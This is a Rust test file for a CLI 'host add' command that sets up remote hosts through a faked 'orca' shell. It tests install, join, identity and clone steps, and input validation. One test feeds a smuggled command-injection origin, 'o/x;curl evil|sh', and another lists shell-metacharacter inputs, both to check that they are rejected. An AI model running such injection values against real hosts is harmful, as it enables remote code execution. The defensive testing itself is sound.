use std::cell::RefCell;

use super::*;
use crate::exec::Output;
use crate::ports::fake;

// A host as `host add` finds it: what its shell has, and its Orca's project setups as
// (path, kind, project), which it lists by exact project ID as Orca does. Each terminal's
// command, as typed, is kept in `typed`.
#[derive(Default)]
struct Machine {
    git: bool,
    claude: bool,
    auto: bool,
    joined: bool,
    cloned: bool,
    identified: bool,
    credits: bool,
    // A build that doesn't know `host identify`.
    stale: bool,
    setups: Vec<(String, String, String)>,
    typed: Vec<String>,
    imported: usize,
    last: i32,
}

fn shell(host: &RefCell<Machine>) -> impl FnMut(&str, &[&str], Option<&str>) -> Result<Output, Error> + '_ {
    move |program, args, _| {
        assert_eq!(program, "orca");
        let mut m = host.borrow_mut();
        let out = match args {
            ["host", "name", ..] => json!({ "result": { "platform": "linux" } }),
            ["project", "setups", rest @ ..] => json!({ "result": { "setups": m.setups.iter().filter(|(_, _, project)| !matches!(rest, ["--project", only, ..] if only != project)).map(|(path, kind, project)| json!({ "path": path, "kind": kind, "projectId": project, "setupState": "ready" })).collect::<Vec<_>>() } }),
            ["project", "setup-existing-folder", "--project", project, "--host", "runtime:e1", "--path", path, "--kind", kind, ..] => {
                m.imported += 1;
                m.setups.push((path.to_string(), kind.to_string(), project.to_string()));
                json!({ "result": {} })
            }
            ["terminal", "create", "--worktree", "path:/home/me/first", "--command", command, "--environment", "e1", "--json"] => {
                m.typed.push(command.to_string());
                let ok = if command.contains("git hook list") {
                    m.git
                } else if command.contains("install.sh") {
                    m.claude = true;
                    true
                } else if command.contains("command -v claude") {
                    m.claude
                } else if command.contains("defaultMode") {
                    m.auto
                } else if command.contains("host join") {
                    m.joined = true;
                    m.credits = true;
                    true
                } else if command.contains("host identify --check") {
                    !m.stale && if command.contains("--co-author") { m.credits } else { m.identified }
                } else if command.contains("host identify") {
                    m.identified = !m.stale;
                    !m.stale
                } else if command.contains("whoami") || command.contains("command -v tolkster") {
                    m.joined
                } else if command.contains("host clone") {
                    m.cloned = true;
                    true
                } else {
                    panic!("{command}")
                };
                m.last = if ok { 0 } else { 1 };
                json!({ "result": { "terminal": { "handle": "term-1" } } })
            }
            ["terminal", "wait", "--terminal", "term-1", ..] => json!({ "result": { "wait": { "satisfied": true, "exitCode": m.last } } }),
            ["terminal", "close", ..] => json!({ "result": {} }),
            _ => panic!("{}", args.join(" ")),
        };
        Ok(Output::ok(out.to_string()))
    }
}

fn added(host: &RefCell<Machine>, minted: &mut Vec<String>) -> Vec<Step> {
    added_with(host, minted, None, false)
}

fn added_with(host: &RefCell<Machine>, minted: &mut Vec<String>, checkout: Option<(&str, &str)>, rejoin: bool) -> Vec<Step> {
    added_as(host, minted, checkout, rejoin, None, None)
}

fn added_as(host: &RefCell<Machine>, minted: &mut Vec<String>, checkout: Option<(&str, &str)>, rejoin: bool, author: Option<&Author>, co_author: Option<&str>) -> Vec<Step> {
    let url = WorkerUrl::parse("https://tolkster.example.workers.dev").unwrap();
    let env = Host { id: "e1".into(), name: "wsl".into() };
    let repos = [("tolkster".to_string(), "Tolkien-Works/tolkster".to_string())];
    let target = Target { host: &env, destination: "/srv", worker_url: &url, commit: &Sha::parse(&"b2".repeat(20)).unwrap(), repos: &repos, checkout, rejoin, author, co_author };
    let mut run = shell(host);
    add(&mut run, &target, &mut || {
        minted.push("c0de".repeat(16));
        Ok(minted.last().unwrap().clone())
    })
    .unwrap()
}

fn verdicts(steps: &[Step]) -> Vec<(&str, &str)> {
    steps.iter().map(|s| (s.step.as_str(), s.verdict)).collect()
}

// A host with one other repo set up on it in Orca, whose folder the terminals open in.
fn with_first(machine: Machine) -> Machine {
    Machine { setups: vec![("/home/me/first".into(), "git".into(), "github:o/first".into())], ..machine }
}

// A fresh host with git and no Claude ends set up with no step by hand, and a second run
// changes nothing: no install, no code, no import.
#[test]
fn a_fresh_host_is_set_up_and_a_second_run_changes_nothing() {
    let host = RefCell::new(with_first(Machine { git: true, auto: true, ..Machine::default() }));
    let mut minted = Vec::new();
    let steps = added(&host, &mut minted);
    assert_eq!(verdicts(&steps), [("git", "ok"), ("claude", "done"), ("auto mode", "ok"), ("tolkster", "done"), ("repo tolkster", "done")]);
    assert_eq!(minted.len(), 1);
    let join = host.borrow().typed.iter().find(|t| t.contains("host join")).cloned().unwrap();
    assert!(join.contains(&minted[0]) && join.contains(&format!("https://tolkster.example.workers.dev/build/linux-x64/{}", "b2".repeat(20))) && join.ends_with("; exit $LASTEXITCODE"), "{join}");
    assert!(host.borrow().setups.contains(&("/srv/tolkster".into(), "git".into(), "github:tolkien-works/tolkster".into())));
    let (imported, typed) = (host.borrow().imported, host.borrow().typed.len());
    let again = added(&host, &mut minted);
    assert_eq!(verdicts(&again), [("git", "ok"), ("claude", "ok"), ("auto mode", "ok"), ("tolkster", "ok"), ("repo tolkster", "ok")]);
    assert_eq!((minted.len(), host.borrow().imported), (1, imported));
    assert!(host.borrow().typed[typed..].iter().all(|t| !t.contains("install.sh") && !t.contains("host join") && !t.contains("host clone")));
}

// The owner's author identity and co-author reach the host as hex a shell reads as plain, and a
// second run types nothing that changes it.
#[test]
fn a_host_gets_the_owner_s_identity_and_co_author_once() {
    let host = RefCell::new(with_first(Machine { git: true, claude: true, auto: true, ..Machine::default() }));
    let (mut minted, author) = (Vec::new(), Author { name: "Ada Lovelace".into(), email: "ada@example.com".into() });
    let co_author = "Tolkster <1+tolkster[bot]@users.noreply.github.com>";
    let steps = added_as(&host, &mut minted, None, false, Some(&author), Some(co_author));
    assert_eq!(verdicts(&steps)[3..6], [("tolkster", "done"), ("co-author", "ok"), ("git author", "done")]);
    let typed = host.borrow().typed.clone();
    assert!(typed.iter().all(|t| !t.contains("Ada") && !t.contains('@')), "{typed:?}");
    assert!(typed.iter().any(|t| t.contains(&format!("host identify --name {} --email {}", hex(&author.name), hex(&author.email)))));
    let before = typed.len();
    let again = added_as(&host, &mut minted, None, false, Some(&author), Some(co_author));
    assert_eq!(verdicts(&again)[3..6], [("tolkster", "ok"), ("co-author", "ok"), ("git author", "ok")]);
    assert_eq!(minted.len(), 1);
    assert!(host.borrow().typed[before..].iter().all(|t| t.contains("--check") || !t.contains("host identify")));
}

// A host joined before the owner set a co-author is not joined again unasked: a join takes it
// out of placement. `--rejoin` does, and then its settings hold the co-author.
#[test]
fn a_host_that_does_not_credit_the_co_author_waits_for_a_rejoin() {
    let host = RefCell::new(with_first(Machine { git: true, claude: true, auto: true, joined: true, ..Machine::default() }));
    let (mut minted, co_author) = (Vec::new(), Some("Tolkster <1+tolkster[bot]@users.noreply.github.com>"));
    let steps = added_as(&host, &mut minted, None, false, None, co_author);
    assert_eq!(verdicts(&steps)[3..], [("tolkster", "ok"), ("co-author", "fail")]);
    assert!(minted.is_empty());
    let steps = added_as(&host, &mut minted, None, true, None, co_author);
    assert_eq!(verdicts(&steps)[3..5], [("tolkster", "done"), ("co-author", "ok")]);
}

// A host whose tolkster can't set the identity fails the step, and nothing goes on after it.
#[test]
fn a_host_that_cannot_be_given_the_identity_fails() {
    let host = RefCell::new(with_first(Machine { git: true, claude: true, auto: true, joined: true, stale: true, ..Machine::default() }));
    let author = Author { name: "Ada".into(), email: "ada@example.com".into() };
    let steps = added_as(&host, &mut Vec::new(), None, false, Some(&author), None);
    assert_eq!(verdicts(&steps)[3..], [("tolkster", "ok"), ("git author", "fail")]);
}

// A recipe's checkout, as old as its image, is fetched through the joined tolkster.
#[test]
fn a_recipe_s_checkout_is_fetched_once_joined() {
    let host = RefCell::new(with_first(Machine { git: true, claude: true, auto: true, ..Machine::default() }));
    let steps = added_with(&host, &mut Vec::new(), Some(("Tolkien-Works/tolkster", "/home/me/first")), false);
    assert_eq!(verdicts(&steps)[3..5], [("tolkster", "done"), ("checkout", "done")]);
    assert!(host.borrow().typed.iter().any(|t| t.contains(r#"host clone Tolkien-Works/tolkster --into "/home/me/first""#)));
}

// The names the Worker serves builds under are the ones the CLI asks for.
#[test]
fn each_os_asks_for_a_target_the_worker_builds() {
    for os in [Os::Linux, Os::Mac, Os::Windows] {
        assert!(prebuilt::TARGETS.contains(&os.target()), "{os:?}");
    }
}

// With no repo set up on it, no terminal can open there: nothing runs.
#[test]
fn a_host_with_no_repo_set_up_is_refused() {
    let host = RefCell::new(Machine { git: true, ..Machine::default() });
    let mut minted = Vec::new();
    let steps = added(&host, &mut minted);
    assert_eq!(verdicts(&steps), [("first repo", "fail")]);
    assert!(minted.is_empty() && host.borrow().typed.is_empty() && host.borrow().imported == 0);
}

// Without git it stops at git: nothing is installed, no code is minted, nothing is cloned.
#[test]
fn a_host_without_git_stops_before_anything_else() {
    let host = RefCell::new(with_first(Machine::default()));
    let mut minted = Vec::new();
    let steps = added(&host, &mut minted);
    assert_eq!(verdicts(&steps), [("git", "fail")]);
    assert!(steps[0].reason.contains("install git"));
    assert!(minted.is_empty() && !host.borrow().claude && !host.borrow().cloned);
    assert_eq!(host.borrow().typed.len(), 1);
}

// A missing auto mode stops it before the join: nothing is minted for a host whose workers
// would wait on prompts.
#[test]
fn a_missing_auto_mode_stops_before_the_join() {
    let host = RefCell::new(with_first(Machine { git: true, claude: true, ..Machine::default() }));
    let mut minted = Vec::new();
    let steps = added(&host, &mut minted);
    assert_eq!(verdicts(&steps), [("git", "ok"), ("claude", "ok"), ("auto mode", "fail")]);
    assert!(minted.is_empty() && !host.borrow().cloned);
}

// Each repo `repos` maps is set up under its own display name, by its GitHub origin here; one
// with no origin, or a name or origin a shell line can't take, is reported instead.
#[test]
fn the_repos_are_those_mapped_with_an_origin_here() {
    let mut config = fake::config("/briefs");
    config.repos = crate::config::repo_map::RepoMap::from_config(Some(&json!({ "tolkster": { "teams": ["TW"] }, "Other Thing": { "teams": ["OT"] }, "gone": { "teams": ["GO"] }, "odd": { "teams": ["OD"] }, "..": { "teams": ["UP"] } }))).unwrap();
    let github = [("Tolkster", "Tolkien-Works/tolkster"), ("Other Thing", "o/thing"), ("odd", "o/x;curl evil|sh"), ("..", "o/up")].map(|(name, repo)| (name.to_string(), repo.to_string()));
    let (found, unknown) = mapped_repos(&config, &github);
    assert_eq!(found, [("Tolkster".to_string(), "Tolkien-Works/tolkster".to_string())]);
    assert_eq!(unknown, ["..", "Other Thing", "gone", "odd"]);
}

// What fills a line for a host's shell is never its syntax nor an option, quoted or not.
#[test]
fn a_host_s_shell_line_takes_only_plain_fills() {
    assert_eq!(CommandLine::template("x {} --into \"{}\"", &["o/n", r"C:\src\n"]).unwrap().as_str(), r#"x o/n --into "C:\src\n""#);
    assert!(CommandLine::template("x {}", &["https://w.example.dev:8787"]).is_ok());
    for bad in ["o/x;sh", "a b", "a|b", "a&b", "-x", "", "a'b", "a(b)", "a>b"] {
        assert!(CommandLine::template("x {}", &[bad]).is_err(), "{bad}");
    }
}

// `--rejoin` joins a host again though its `tolkster` answers as joined.
#[test]
fn a_rejoin_joins_a_host_that_says_it_has_joined() {
    let host = RefCell::new(with_first(Machine { git: true, auto: true, ..Machine::default() }));
    let mut minted = Vec::new();
    added(&host, &mut minted);
    let steps = added_with(&host, &mut minted, None, true);
    assert!(verdicts(&steps).contains(&("tolkster", "done")));
    assert_eq!(minted.len(), 2);
}
